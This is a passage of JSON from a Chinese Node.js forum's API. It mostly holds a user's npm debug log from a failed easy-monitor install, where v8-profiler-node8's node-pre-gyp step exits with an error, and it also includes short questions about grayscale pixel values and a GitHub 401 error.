idealTree +-- mkdirp@0.5.1\n30 silly idealTree +-- ms@2.0.0\n30 silly idealTree +-- nan@2.11.1\n30 silly idealTree +-- needle@2.2.4\n30 silly idealTree +-- negotiator@0.6.1\n30 silly idealTree +-- node-pre-gyp@0.12.0\n30 silly idealTree +-- nopt@4.0.1\n30 silly idealTree +-- npm-bundled@1.0.5\n30 silly idealTree +-- npm-packlist@1.1.12\n30 silly idealTree +-- npmlog@4.1.2\n30 silly idealTree +-- number-is-nan@1.0.1\n30 silly idealTree +-- object-assign@4.1.1\n30 silly idealTree +-- on-finished@2.3.0\n30 silly idealTree +-- on-headers@1.0.1\n30 silly idealTree +-- once@1.4.0\n30 silly idealTree +-- os-homedir@1.0.2\n30 silly idealTree +-- os-tmpdir@1.0.2\n30 silly idealTree +-- osenv@0.1.5\n30 silly idealTree +-- parseurl@1.3.2\n30 silly idealTree +-- path-is-absolute@1.0.1\n30 silly idealTree +-- path-to-regexp@0.1.7\n30 silly idealTree +-- pretty-bytes@4.0.2\n30 silly idealTree +-- process-nextick-args@2.0.0\n30 silly idealTree +-- proxy-addr@2.0.4\n30 silly idealTree | &#96;-- ipaddr.js@1.8.0\n30 silly idealTree +-- qs@6.6.0\n30 silly idealTree +-- range-parser@1.2.0\n30 silly idealTree +-- raw-body@2.3.3\n30 silly idealTree | +-- http-errors@1.6.3\n30 silly idealTree | &#96;-- iconv-lite@0.4.23\n30 silly idealTree +-- rc@1.2.8\n30 silly idealTree | &#96;-- minimist@1.2.0\n30 silly idealTree +-- readable-stream@2.3.6\n30 silly idealTree +-- rimraf@2.6.2\n30 silly idealTree +-- safe-buffer@5.1.2\n30 silly idealTree +-- safer-buffer@2.1.2\n30 silly idealTree +-- sax@1.2.4\n30 silly idealTree +-- semver@5.6.0\n30 silly idealTree +-- send@0.16.2\n30 silly idealTree | +-- http-errors@1.6.3\n30 silly idealTree | +-- mime@1.4.1\n30 silly idealTree | &#96;-- statuses@1.4.0\n30 silly idealTree +-- serve-favicon@2.5.0\n30 silly idealTree | +-- ms@2.1.1\n30 silly idealTree | &#96;-- safe-buffer@5.1.1\n30 silly idealTree +-- serve-static@1.13.2\n30 silly idealTree +-- set-blocking@2.0.0\n30 silly idealTree +-- setprototypeof@1.1.0\n30 silly idealTree +-- signal-exit@3.0.2\n30 silly idealTree +-- statuses@1.5.0\n30 silly idealTree +-- string_decoder@1.1.1\n30 silly idealTree +-- string-width@1.0.2\n30 silly idealTree +-- strip-ansi@3.0.1\n30 silly idealTree +-- strip-json-comments@2.0.1\n30 silly idealTree +-- tar@4.4.8\n30 silly idealTree +-- through@2.3.8\n30 silly idealTree +-- toidentifier@1.0.0\n30 silly idealTree +-- type-is@1.6.16\n30 silly idealTree +-- unpipe@1.0.0\n30 silly idealTree +-- util-deprecate@1.0.2\n30 silly idealTree +-- utils-merge@1.0.1\n30 silly idealTree +-- v8-profiler-node8@6.0.1\n30 silly idealTree | &#96;-- node-pre-gyp@0.11.0\n30 silly idealTree +-- vary@1.1.2\n30 silly idealTree +-- wide-align@1.1.3\n30 silly idealTree +-- wrappy@1.0.2\n30 silly idealTree &#96;-- yallist@3.0.3\n31 silly install generateActionsToTake\n32 timing stage:generateActionsToTake Completed in 29ms\n33 silly diffTrees action count 4\n34 silly diffTrees add nan@2.11.1\n35 silly diffTrees add node-pre-gyp@0.11.0\n36 silly diffTrees add v8-profiler-node8@6.0.1\n37 silly diffTrees add easy-monitor@2.2.6-rc.0\n38 silly decomposeActions action count 32\n39 silly decomposeActions fetch nan@2.11.1\n40 silly decomposeActions extract nan@2.11.1\n41 silly decomposeActions preinstall nan@2.11.1\n42 silly decomposeActions build nan@2.11.1\n43 silly decomposeActions install nan@2.11.1\n44 silly decomposeActions postinstall nan@2.11.1\n45 silly decomposeActions finalize nan@2.11.1\n46 silly decomposeActions refresh-package-json nan@2.11.1\n47 silly decomposeActions fetch node-pre-gyp@0.11.0\n48 silly decomposeActions extract node-pre-gyp@0.11.0\n49 silly decomposeActions preinstall node-pre-gyp@0.11.0\n50 silly decomposeActions build node-pre-gyp@0.11.0\n51 silly decomposeActions install node-pre-gyp@0.11.0\n52 silly decomposeActions postinstall node-pre-gyp@0.11.0\n53 silly decomposeActions finalize node-pre-gyp@0.11.0\n54 silly decomposeActions refresh-package-json node-pre-gyp@0.11.0\n55 silly decomposeActions fetch v8-profiler-node8@6.0.1\n56 silly decomposeActions extract v8-profiler-node8@6.0.1\n57 silly decomposeActions preinstall v8-profiler-node8@6.0.1\n58 silly decomposeActions build v8-profiler-node8@6.0.1\n59 silly decomposeActions install v8-profiler-node8@6.0.1\n60 silly decomposeActions postinstall v8-profiler-node8@6.0.1\n61 silly decomposeActions finalize v8-profiler-node8@6.0.1\n62 silly decomposeActions refresh-package-json v8-profiler-node8@6.0.1\n63 silly decomposeActions fetch easy-monitor@2.2.6-rc.0\n64 silly decomposeActions extract easy-monitor@2.2.6-rc.0\n65 silly decomposeActions preinstall easy-monitor@2.2.6-rc.0\n66 silly decomposeActions build easy-monitor@2.2.6-rc.0\n67 silly decomposeActions install easy-monitor@2.2.6-rc.0\n68 silly decomposeActions postinstall easy-monitor@2.2.6-rc.0\n69 silly decomposeActions finalize easy-monitor@2.2.6-rc.0\n70 silly decomposeActions refresh-package-json easy-monitor@2.2.6-rc.0\n71 silly install executeActions\n72 silly doSerial global-install 32\n73 verbose correctMkdir C:\\Users\\Client\\AppData\\Roaming\\npm-cache\\_locks correctMkdir not in flight; initializing\n74 timing audit compress Completed in 4ms\n75 info audit Submitting payload of 6468bytes\n76 verbose lock using C:\\Users\\Client\\AppData\\Roaming\\npm-cache\\_locks\\staging-0f116ff4a537fc52.lock for C:\\Users\\Client\\node_modules\\.staging\n77 silly doParallel extract 4\n78 silly extract nan@2.11.1\n79 silly extract node-pre-gyp@0.11.0\n80 silly extract v8-profiler-node8@6.0.1\n81 silly extract easy-monitor@2.2.6-rc.0\n82 silly tarball trying nan@^2.5.1 by hash: sha1-kOIrzLjKV+pM03zIPTgZtS7qZ2Y=\n83 silly tarball trying node-pre-gyp@^0.11.0 by hash: sha1-2x8zIVJy9pLNOPAyOOPptHxd0FQ=\n84 silly tarball trying v8-profiler-node8@^6.0.1 by hash: sha1-JVj12rdiLyMFIT5sy03eH2bMYx8=\n85 silly tarball trying easy-monitor@latest by hash: sha1-UguUR9oVtWRuY+UJuClp4mBMC88=\n86 silly extract v8-profiler-node8@^6.0.1 extracted to C:\\Users\\Client\\node_modules\\.staging\\v8-profiler-node8-a3d8f880 (81ms)\n87 silly extract node-pre-gyp@^0.11.0 extracted to C:\\Users\\Client\\node_modules\\.staging\\node-pre-gyp-51c786c3 (102ms)\n88 http fetch POST 404 https:&#x2F;&#x2F;registry.npm.taobao.org&#x2F;-&#x2F;npm&#x2F;v1&#x2F;security&#x2F;audits&#x2F;quick 209ms\n89 silly extract nan@^2.5.1 extracted to C:\\Users\\Client\\node_modules\\.staging\\nan-1e281254 (118ms)\n90 silly extract easy-monitor@latest extracted to C:\\Users\\Client\\node_modules\\.staging\\easy-monitor-df95bbbb (220ms)\n91 timing action:extract Completed in 223ms\n92 silly doReverseSerial unbuild 32\n93 silly doSerial remove 32\n94 silly doSerial move 32\n95 silly doSerial finalize 32\n96 silly finalize C:\\Users\\Client\\node_modules\\nan\n97 silly finalize C:\\Users\\Client\\node_modules\\v8-profiler-node8\\node_modules\\node-pre-gyp\n98 silly finalize C:\\Users\\Client\\node_modules\\v8-profiler-node8\n99 silly finalize C:\\Users\\Client\\node_modules\\easy-monitor\n100 timing action:finalize Completed in 29ms\n101 silly doParallel refresh-package-json 4\n102 silly refresh-package-json C:\\Users\\Client\\node_modules\\nan\n103 silly refresh-package-json C:\\Users\\Client\\node_modules\\v8-profiler-node8\\node_modules\\node-pre-gyp\n104 silly refresh-package-json C:\\Users\\Client\\node_modules\\v8-profiler-node8\n105 silly refresh-package-json C:\\Users\\Client\\node_modules\\easy-monitor\n106 timing action:refresh-package-json Completed in 20ms\n107 silly doParallel preinstall 4\n108 silly preinstall nan@2.11.1\n109 info lifecycle nan@2.11.1~preinstall: nan@2.11.1\n110 silly preinstall node-pre-gyp@0.11.0\n111 info lifecycle node-pre-gyp@0.11.0~preinstall: node-pre-gyp@0.11.0\n112 silly preinstall v8-profiler-node8@6.0.1\n113 info lifecycle v8-profiler-node8@6.0.1~preinstall: v8-profiler-node8@6.0.1\n114 silly preinstall easy-monitor@2.2.6-rc.0\n115 info lifecycle easy-monitor@2.2.6-rc.0~preinstall: easy-monitor@2.2.6-rc.0\n116 verbose lifecycle v8-profiler-node8@6.0.1~preinstall: unsafe-perm in lifecycle true\n117 verbose lifecycle v8-profiler-node8@6.0.1~preinstall: PATH: C:\\Users\\Client\\AppData\\Roaming\\npm\\node_modules\\npm\\node_modules\\npm-lifecycle\\node-gyp-bin;C:\\Users\\Client\\node_modules\\v8-profiler-node8\\node_modules\\.bin;C:\\Users\\Client\\node_modules\\.bin;C:\\Python27\\;C:\\Python27\\Scripts;C:\\Program Files (x86)\\Java\\jre1.8.0_151\\bin;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Program Files (x86)\\NVIDIA Corporation\\PhysX\\Common;C:\\Program Files\\TortoiseSVN\\bin;C:\\Program Files (x86)\\Windows Kits\\8.1\\Windows Performance Toolkit\\;C:\\Program Files\\Microsoft SQL Server\\110\\Tools\\Binn\\;C:\\Program Files\\EmEditor;D:\\Program Files\\IDM Computer Solutions\\UltraEdit;C:\\Program Files (x86)\\CMake\\bin;C:\\Program Files\\dotnet\\;C:\\Program Files\\Microsoft SQL Server\\130\\Tools\\Binn\\;C:\\Program Files\\nodejs\\;D:\\Users\\ChengXu1\\AppData\\Local\\Atlassian\\SourceTree\\git_local\\bin;C:\\xampp\\php;C:\\Program Files (x86)\\Microsoft VS Code\\bin;C:\\Users\\Client\\AppData\\Roaming\\npm;C:\\Program Files (x86)\\Egret\\Egret Wing 3\\bin\n118 verbose lifecycle v8-profiler-node8@6.0.1~preinstall: CWD: C:\\Users\\Client\\node_modules\\v8-profiler-node8\n119 silly lifecycle v8-profiler-node8@6.0.1~preinstall: Args: [ &#x27;&#x2F;d &#x2F;s &#x2F;c&#x27;, &#x27;node -e \\&#x27;process.exit(0)\\&#x27;&#x27; ]\n120 silly lifecycle v8-profiler-node8@6.0.1~preinstall: Returned: code: 0  signal: null\n121 timing action:preinstall Completed in 177ms\n122 silly doSerial build 32\n123 silly build nan@2.11.1\n124 info linkStuff nan@2.11.1\n125 silly linkStuff nan@2.11.1 has C:\\Users\\Client\\node_modules as its parent node_modules\n126 silly build node-pre-gyp@0.11.0\n127 info linkStuff node-pre-gyp@0.11.0\n128 silly linkStuff node-pre-gyp@0.11.0 has C:\\Users\\Client\\node_modules\\v8-profiler-node8\\node_modules as its parent node_modules\n129 verbose linkBins [ { &#x27;node-pre-gyp&#x27;: &#x27;.&#x2F;bin&#x2F;node-pre-gyp&#x27; },\n129 verbose linkBins   &#x27;C:\\\\Users\\\\Client\\\\node_modules\\\\v8-profiler-node8\\\\node_modules\\\\.bin&#x27;,\n129 verbose linkBins   false ]\n130 silly build v8-profiler-node8@6.0.1\n131 info linkStuff v8-profiler-node8@6.0.1\n132 silly linkStuff v8-profiler-node8@6.0.1 has C:\\Users\\Client\\node_modules as its parent node_modules\n133 silly build easy-monitor@2.2.6-rc.0\n134 info linkStuff easy-monitor@2.2.6-rc.0\n135 silly linkStuff easy-monitor@2.2.6-rc.0 has C:\\Users\\Client\\node_modules as its parent node_modules\n136 timing action:build Completed in 8ms\n137 silly doSerial global-link 32\n138 silly doParallel update-linked 0\n139 silly doSerial install 32\n140 silly install nan@2.11.1\n141 info lifecycle nan@2.11.1~install: nan@2.11.1\n142 silly install node-pre-gyp@0.11.0\n143 info lifecycle node-pre-gyp@0.11.0~install: node-pre-gyp@0.11.0\n144 silly install v8-profiler-node8@6.0.1\n145 info lifecycle v8-profiler-node8@6.0.1~install: v8-profiler-node8@6.0.1\n146 verbose lifecycle v8-profiler-node8@6.0.1~install: unsafe-perm in lifecycle true\n147 verbose lifecycle v8-profiler-node8@6.0.1~install: PATH: C:\\Users\\Client\\AppData\\Roaming\\npm\\node_modules\\npm\\node_modules\\npm-lifecycle\\node-gyp-bin;C:\\Users\\Client\\node_modules\\v8-profiler-node8\\node_modules\\.bin;C:\\Users\\Client\\node_modules\\.bin;C:\\Python27\\;C:\\Python27\\Scripts;C:\\Program Files (x86)\\Java\\jre1.8.0_151\\bin;C:\\Windows\\system32;C:\\Windows;C:\\Windows\\System32\\Wbem;C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\;C:\\Program Files (x86)\\NVIDIA Corporation\\PhysX\\Common;C:\\Program Files\\TortoiseSVN\\bin;C:\\Program Files (x86)\\Windows Kits\\8.1\\Windows Performance Toolkit\\;C:\\Program Files\\Microsoft SQL Server\\110\\Tools\\Binn\\;C:\\Program Files\\EmEditor;D:\\Program Files\\IDM Computer Solutions\\UltraEdit;C:\\Program Files (x86)\\CMake\\bin;C:\\Program Files\\dotnet\\;C:\\Program Files\\Microsoft SQL Server\\130\\Tools\\Binn\\;C:\\Program Files\\nodejs\\;D:\\Users\\ChengXu1\\AppData\\Local\\Atlassian\\SourceTree\\git_local\\bin;C:\\xampp\\php;C:\\Program Files (x86)\\Microsoft VS Code\\bin;C:\\Users\\Client\\AppData\\Roaming\\npm;C:\\Program Files (x86)\\Egret\\Egret Wing 3\\bin\n148 verbose lifecycle v8-profiler-node8@6.0.1~install: CWD: C:\\Users\\Client\\node_modules\\v8-profiler-node8\n149 silly lifecycle v8-profiler-node8@6.0.1~install: Args: [ &#x27;&#x2F;d &#x2F;s &#x2F;c&#x27;, &#x27;node-pre-gyp install --fallback-to-build&#x27; ]\n150 silly lifecycle v8-profiler-node8@6.0.1~install: Returned: code: 1  signal: null\n151 info lifecycle v8-profiler-node8@6.0.1~install: Failed to exec install script\n152 timing action:install Completed in 13529ms\n153 verbose unlock done using C:\\Users\\Client\\AppData\\Roaming\\npm-cache\\_locks\\staging-0f116ff4a537fc52.lock for C:\\Users\\Client\\node_modules\\.staging\n154 timing stage:rollbackFailedOptional Completed in 70ms\n155 timing stage:runTopLevelLifecycles Completed in 15582ms\n156 silly saveTree Client\n156 silly saveTree +-- abbrev@1.1.1\n156 silly saveTree +-- accepts@1.3.5\n156 silly saveTree | +-- mime-types@2.1.21\n156 silly saveTree | | &#96;-- mime-db@1.37.0\n156 silly saveTree | &#96;-- negotiator@0.6.1\n156 silly saveTree +-- ansi-regex@2.1.1\n156 silly saveTree +-- aproba@1.2.0\n156 silly saveTree +-- are-we-there-yet@1.1.5\n156 silly saveTree | +-- delegates@1.0.0\n156 silly saveTree | &#96;-- readable-stream@2.3.6\n156 silly saveTree |   +-- core-util-is@1.0.2\n156 silly saveTree |   +-- inherits@2.0.3\n156 silly saveTree |   +-- isarray@1.0.0\n156 silly saveTree |   +-- process-nextick-args@2.0.0\n156 silly saveTree |   +-- safe-buffer@5.1.2\n156 silly saveTree |   +-- string_decoder@1.1.1\n156 silly saveTree |   &#96;-- util-deprecate@1.0.2\n156 silly saveTree +-- array-flatten@1.1.1\n156 silly saveTree +-- balanced-match@1.0.0\n156 silly saveTree +-- basic-auth@1.1.0\n156 silly saveTree +-- body-parser@1.18.3\n156 silly saveTree | +-- bytes@3.0.0\n156 silly saveTree | +-- content-type@1.0.4\n156 silly saveTree | +-- debug@2.6.9\n156 silly saveTree | | &#96;-- ms@2.0.0\n156 silly saveTree | +-- depd@1.1.2\n156 silly saveTree | +-- http-errors@1.6.3\n156 silly saveTree | | +-- setprototypeof@1.1.0\n156 silly saveTree | | &#96;-- statuses@1.5.0\n156 silly saveTree | +-- iconv-lite@0.4.23\n156 silly saveTree | | &#96;-- safer-buffer@2.1.2\n156 silly saveTree | +-- on-finished@2.3.0\n156 silly saveTree | | &#96;-- ee-first@1.1.1\n156 silly saveTree | +-- qs@6.5.2\n156 silly saveTree | +-- raw-body@2.3.3\n156 silly saveTree | | +-- http-errors@1.6.3\n156 silly saveTree | | +-- iconv-lite@0.4.23\n156 silly saveTree | | &#96;-- unpipe@1.0.0\n156 silly saveTree | &#96;-- type-is@1.6.16\n156 silly saveTree |   &#96;-- media-typer@0.3.0\n156 silly saveTree +-- brace-expansion@1.1.11\n156 silly saveTree | &#96;-- concat-map@0.0.1\n156 silly saveTree +-- bytes@3.0.0\n156 silly saveTree +-- chownr@1.1.1\n156 silly saveTree +-- co@4.6.0\n156 silly saveTree +-- code-point-at@1.1.0\n156 silly saveTree +-- colors@1.3.2\n156 silly saveTree +-- compressible@2.0.15\n156 silly saveTree +-- compression@1.7.3\n156 silly saveTree | +-- on-headers@1.0.1\n156 silly saveTree | &#96;-- vary@1.1.2\n156 silly saveTree +-- concat-map@0.0.1\n156 silly saveTree +-- console-control-strings@1.1.0\n156 silly saveTree +-- content-disposition@0.5.2\n156 silly saveTree +-- content-type@1.0.4\n156 silly saveTree +-- cookie-signature@1.1.0\n156 silly saveTree +-- cookie@0.3.1\n156 silly saveTree +-- core-util-is@1.0.2\n156 silly saveTree +-- debug@2.6.9\n156 silly saveTree +-- deep-extend@0.6.0\n156 silly saveTree +-- delegates@1.0.0\n156 silly saveTree +-- depd@1.1.2\n156 silly saveTree +-- destroy@1.0.4\n156 silly saveTree +-- detect-libc@1.0.3\n156 silly saveTree +-- easy-monitor@2.2.6-rc.0\n156 silly saveTree | +-- ejs@2.6.1\n156 silly saveTree | +-- express@4.16.4\n156 silly saveTree | | +-- cookie-signature@1.0.6\n156 silly saveTree | | +-- encodeurl@1.0.2\n156 silly saveTree | | +-- escape-html@1.0.3\n156 silly saveTree | | +-- etag@1.8.1\n156 silly saveTree | | +-- finalhandler@1.1.1\n156 silly saveTree | | | +-- parseurl@1.3.2\n156 silly saveTree | | | &#96;-- statuses@1.4.0\n156 silly saveTree | | +-- fresh@0.5.2\n156 silly saveTree | | +-- merge-descriptors@1.0.1\n156 silly saveTree | | +-- methods@1.1.2\n156 silly saveTree | | +-- parseurl@1.3.2\n156 silly saveTree | | +-- path-to-regexp@0.1.7\n156 silly saveTree | | +-- proxy-addr@2.0.4\n156 silly saveTree | | | +-- forwarded@0.1.2\n156 silly saveTree | | | &#96;-- ipaddr.js@1.8.0\n156 silly saveTree | | +-- qs@6.5.2\n156 silly saveTree | | +-- range-parser@1.2.0\n156 silly saveTree | | +-- send@0.16.2\n156 silly saveTree | | | +-- http-errors@1.6.3\n156 silly saveTree | | | | &#96;-- statuses@1.4.0\n156 silly saveTree | | | +-- mime@1.4.1\n156 silly saveTree | | | &#96;-- statuses@1.4.0\n156 silly saveTree | | +-- serve-static@1.13.2\n156 silly saveTree | | +-- statuses@1.4.0\n156 silly saveTree | | &#96;-- utils-merge@1.0.1\n156 silly saveTree | +-- glob@7.1.3\n156 silly saveTree | | +-- fs.realpath@1.0.0\n156 silly saveTree | | +-- inflight@1.0.6\n156 silly saveTree | | | +-- once@1.4.0\n156 silly saveTree | | | | &#96;-- wrappy@1.0.2\n156 silly saveTree | | | &#96;-- wrappy@1.0.2\n156 silly saveTree | | +-- minimatch@3.0.4\n156 silly saveTree | | +-- once@1.4.0\n156 silly saveTree | | &#96;-- path-is-absolute@1.0.1\n156 silly saveTree | +-- JSONStream@1.3.5\n156 silly saveTree | | +-- jsonparse@1.3.1\n156 silly saveTree | | &#96;-- through@2.3.8\n156 silly saveTree | +-- lodash@4.17.11\n156 silly saveTree | +-- pretty-bytes@4.0.2\n156 silly saveTree | +-- serve-favicon@2.5.0\n156 silly saveTree | | +-- ms@2.1.1\n156 silly saveTree | | &#96;-- safe-buffer@5.1.1\n156 silly saveTree | &#96;-- v8-profiler-node8@6.0.1\n156 silly saveTree |   +-- nan@2.11.1\n156 silly saveTree |   &#96;-- node-pre-gyp@0.11.0\n156 silly saveTree |     +-- mkdirp@0.5.1\n156 silly saveTree |     | &#96;-- minimist@0.0.8\n156 silly saveTree |     +-- needle@2.2.4\n156 silly saveTree |     | +-- iconv-lite@0.4.24\n156 silly saveTree |     | &#96;-- sax@1.2.4\n156 silly saveTree |     +-- nopt@4.0.1\n156 silly saveTree |     | &#96;-- osenv@0.1.5\n156 silly saveTree |     |   +-- os-homedir@1.0.2\n156 silly saveTree |     |   &#96;-- os-tmpdir@1.0.2\n156 silly saveTree |     +-- npm-packlist@1.1.12\n156 silly saveTree |     | +-- ignore-walk@3.0.1\n156 silly saveTree |     | &#96;-- npm-bundled@1.0.5\n156 silly saveTree |     +-- npmlog@4.1.2\n156 silly saveTree |     | +-- gauge@2.7.4\n156 silly saveTree |     | | +-- has-unicode@2.0.1\n156 silly saveTree |     | | +-- object-assign@4.1.1\n156 silly saveTree |     | | +-- signal-exit@3.0.2\n156 silly saveTree |     | | +-- string-width@1.0.2\n156 silly saveTree |     | | | +-- is-fullwidth-code-point@1.0.0\n156 silly saveTree |     | | | | &#96;-- number-is-nan@1.0.1\n156 silly saveTree |     | | | &#96;-- strip-ansi@3.0.1\n156 silly saveTree |     | | +-- strip-ansi@3.0.1\n156 silly saveTree |     | | &#96;-- wide-align@1.1.3\n156 silly saveTree |     | &#96;-- set-blocking@2.0.0\n156 silly saveTree |     +-- rc@1.2.8\n156 silly saveTree |     | +-- ini@1.3.5\n156 silly saveTree |     | +-- minimist@1.2.0\n156 silly saveTree |     | &#96;-- strip-json-comments@2.0.1\n156 silly saveTree |     +-- rimraf@2.6.2\n156 silly saveTree |     +-- semver@5.6.0\n156 silly saveTree |     &#96;-- tar@4.4.8\n156 silly saveTree |       +-- fs-minipass@1.2.5\n156 silly saveTree |       | &#96;-- minipass@2.3.5\n156 silly saveTree |       |   &#96;-- yallist@3.0.3\n156 silly saveTree |       +-- minipass@2.3.5\n156 silly saveTree |       +-- minizlib@1.1.1\n156 silly saveTree |       &#96;-- yallist@3.0.3\n156 silly saveTree +-- ee-first@1.1.1\n156 silly saveTree +-- ejs@2.6.1\n156 silly saveTree +-- encodeurl@1.0.2\n156 silly saveTree +-- escape-html@1.0.3\n156 silly saveTree +-- etag@1.8.1\n156 silly saveTree +-- express@4.16.4\n156 silly saveTree +-- finalhandler@1.1.1\n156 silly saveTree +-- forwarded@0.1.2\n156 silly saveTree +-- fresh@0.5.2\n156 silly saveTree +-- fs-minipass@1.2.5\n156 silly saveTree +-- fs.realpath@1.0.0\n156 silly saveTree +-- gauge@2.7.4\n156 silly saveTree +-- glob@7.1.3\n156 silly saveTree +-- has-unicode@2.0.1\n156 silly saveTree +-- http-errors@1.7.1\n156 silly saveTree | &#96;-- toidentifier@1.0.0\n156 silly saveTree +-- iconv-lite@0.4.24\n156 silly saveTree +-- ignore-walk@3.0.1\n156 silly saveTree +-- inflight@1.0.6\n156 silly saveTree +-- inherits@2.0.3\n156 silly saveTree +-- ini@1.3.5\n156 silly saveTree +-- ipaddr.js@1.8.1\n156 silly saveTree +-- is-fullwidth-code-point@1.0.0\n156 silly saveTree +-- isarray@1.0.0\n156 silly saveTree +-- jsonparse@1.3.1\n156 silly saveTree +-- JSONStream@1.3.5\n156 silly saveTree +-- lodash@4.17.11\n156 silly saveTree +-- media-typer@0.3.0\n156 silly saveTree +-- merge-descriptors@1.0.1\n156 silly saveTree +-- methods@1.1.2\n156 silly saveTree +-- mime-db@1.37.0\n156 silly saveTree +-- mime-types@2.1.21\n156 silly saveTree +-- mime@1.6.0\n156 silly saveTree +-- minimatch@3.0.4\n156 silly saveTree +-- minimist@0.0.8\n156 silly saveTree +-- minipass@2.3.5\n156 silly saveTree +-- minizlib@1.1.1\n156 silly saveTree +-- mkdirp@0.5.1\n156 silly saveTree +-- ms@2.0.0\n156 silly saveTree +-- needle@2.2.4\n156 silly saveTree +-- negotiator@0.6.1\n156 silly saveTree +-- node-pre-gyp@0.12.0\n156 silly saveTree +-- nopt@4.0.1\n156 silly saveTree +-- npm-bundled@1.0.5\n156 silly saveTree +-- npm-packlist@1.1.12\n156 silly saveTree +-- npmlog@4.1.2\n156 silly saveTree +-- number-is-nan@1.0.1\n156 silly saveTree +-- object-assign@4.1.1\n156 silly saveTree +-- on-finished@2.3.0\n156 silly saveTree +-- on-headers@1.0.1\n156 silly saveTree +-- once@1.4.0\n156 silly saveTree +-- os-homedir@1.0.2\n156 silly saveTree +-- os-tmpdir@1.0.2\n156 silly saveTree +-- osenv@0.1.5\n156 silly saveTree +-- parseurl@1.3.2\n156 silly saveTree +-- path-is-absolute@1.0.1\n156 silly saveTree +-- path-to-regexp@0.1.7\n156 silly saveTree +-- pretty-bytes@4.0.2\n156 silly saveTree +-- process-nextick-args@2.0.0\n156 silly saveTree +-- proxy-addr@2.0.4\n156 silly saveTree +-- qs@6.6.0\n156 silly saveTree +-- range-parser@1.2.0\n156 silly saveTree +-- raw-body@2.3.3\n156 silly saveTree +-- rc@1.2.8\n156 silly saveTree +-- readable-stream@2.3.6\n156 silly saveTree +-- rimraf@2.6.2\n156 silly saveTree +-- safe-buffer@5.1.2\n156 silly saveTree +-- safer-buffer@2.1.2\n156 silly saveTree +-- sax@1.2.4\n156 silly saveTree +-- semver@5.6.0\n156 silly saveTree +-- send@0.16.2\n156 silly saveTree +-- serve-favicon@2.5.0\n156 silly saveTree +-- serve-static@1.13.2\n156 silly saveTree +-- set-blocking@2.0.0\n156 silly saveTree +-- setprototypeof@1.1.0\n156 silly saveTree +-- signal-exit@3.0.2\n156 silly saveTree +-- statuses@1.5.0\n156 silly saveTree +-- string_decoder@1.1.1\n156 silly saveTree +-- string-width@1.0.2\n156 silly saveTree +-- strip-ansi@3.0.1\n156 silly saveTree +-- strip-json-comments@2.0.1\n156 silly saveTree +-- tar@4.4.8\n156 silly saveTree +-- through@2.3.8\n156 silly saveTree +-- toidentifier@1.0.0\n156 silly saveTree +-- type-is@1.6.16\n156 silly saveTree +-- unpipe@1.0.0\n156 silly saveTree +-- util-deprecate@1.0.2\n156 silly saveTree +-- utils-merge@1.0.1\n156 silly saveTree +-- vary@1.1.2\n156 silly saveTree +-- wide-align@1.1.3\n156 silly saveTree +-- wrappy@1.0.2\n156 silly saveTree &#96;-- yallist@3.0.3\n157 warn enoent ENOENT: no such file or directory, open &#x27;C:\\Users\\Client\\package.json&#x27;\n158 verbose enoent This is related to npm not being able to find a file.\n159 warn Client No description\n160 warn Client No repository field.\n161 warn Client No README data\n162 warn Client No license field.\n163 verbose stack Error: v8-profiler-node8@6.0.1 install: &#96;node-pre-gyp install --fallback-to-build&#96;\n163 verbose stack Exit status 1\n163 verbose stack     at EventEmitter.&lt;anonymous&gt; (C:\\Users\\Client\\AppData\\Roaming\\npm\\node_modules\\npm\\node_modules\\npm-lifecycle\\index.js:301:16)\n163 verbose stack     at EventEmitter.emit (events.js:182:13)\n163 verbose stack     at ChildProcess.&lt;anonymous&gt; (C:\\Users\\Client\\AppData\\Roaming\\npm\\node_modules\\npm\\node_modules\\npm-lifecycle\\lib\\spawn.js:55:14)\n163 verbose stack     at ChildProcess.emit (events.js:182:13)\n163 verbose stack     at maybeClose (internal&#x2F;child_process.js:962:16)\n163 verbose stack     at Process.ChildProcess._handle.onexit (internal&#x2F;child_process.js:251:5)\n164 verbose pkgid v8-profiler-node8@6.0.1\n165 verbose cwd C:\\Users\\Client\n166 verbose Windows_NT 6.1.7601\n167 verbose argv &quot;C:\\\\Program Files\\\\nodejs\\\\node.exe&quot; &quot;C:\\\\Users\\\\Client\\\\AppData\\\\Roaming\\\\npm\\\\node_modules\\\\npm\\\\bin\\\\npm-cli.js&quot; &quot;install&quot; &quot;easy-monitor&quot;\n168 verbose node v10.14.1\n169 verbose npm  v6.4.1\n170 error code ELIFECYCLE\n171 error errno 1\n172 error v8-profiler-node8@6.0.1 install: &#96;node-pre-gyp install --fallback-to-build&#96;\n172 error Exit status 1\n173 error Failed at the v8-profiler-node8@6.0.1 install script.\n173 error This is probably not a problem with npm. There is likely additional logging output above.\n174 verbose exit [ 1, true ]\n\n</code></pre><p>WebStorm 安装报错提示如下\n<img src=\"//static.cnodejs.org/FjO9hu6o-SVq2VAuASlUjxHrDvqb\" alt=\"image.png\"></p>\n</div>","title":"想安装 easy-monitor 来查内存泄露，但是发现安装不了。","last_reply_at":"2018-12-04T07:44:46.991Z","good":false,"top":false,"reply_count":3,"visit_count":563,"create_at":"2018-12-04T06:23:49.170Z","author":{"loginname":"Aaron009","avatar_url":"https://avatars1.githubusercontent.com/u/3838050?v=4&s=120"}},{"id":"5c061ff3d3b8ab334e8da790","author_id":"5c061eddd3b8ab334e8da77f","tab":"ask","content":"<div class=\"markdown-text\"><p>刚开始我使用的是  ‘get-pixels’ 包来进行获取图片的像素值。获取的数据是  0-255 之间。</p>\n<p>但是我想获取的是 0-1之间。 就像 python的scikit-image包里面的 io.imread() 方法解析的是灰度图片。值是 0-1之间的数。</p>\n<p>问题：\n\t\t1、像请问node有没有类似的包呢？\n\t\t2、（我一直在想 0-255 转换 0-1 之间的数。 是除以255）不知道我的想法是否正确</p>\n</div>","title":"node如何获取灰度图片像素值","last_reply_at":"2018-12-04T07:16:41.547Z","good":false,"top":false,"reply_count":2,"visit_count":633,"create_at":"2018-12-04T06:34:27.522Z","author":{"loginname":"xiaofeng1310","avatar_url":"https://avatars2.githubusercontent.com/u/25943670?v=4&s=120"}},{"id":"5c0606bfd3b8ab334e8da69f","author_id":"599fcc08ebaa046923a82766","tab":"ask","content":"<div class=\"markdown-text\"><pre class=\"prettyprint\"><code>documentation_url: &quot;https:&#x2F;&#x2F;developer.github.com&#x2F;v3&quot;\nmessage: &quot;Bad credentials&quot;\n</code></pre></div>","title":"gitpage access_token在本地有效，传到GitHub上就报错 401 Bad 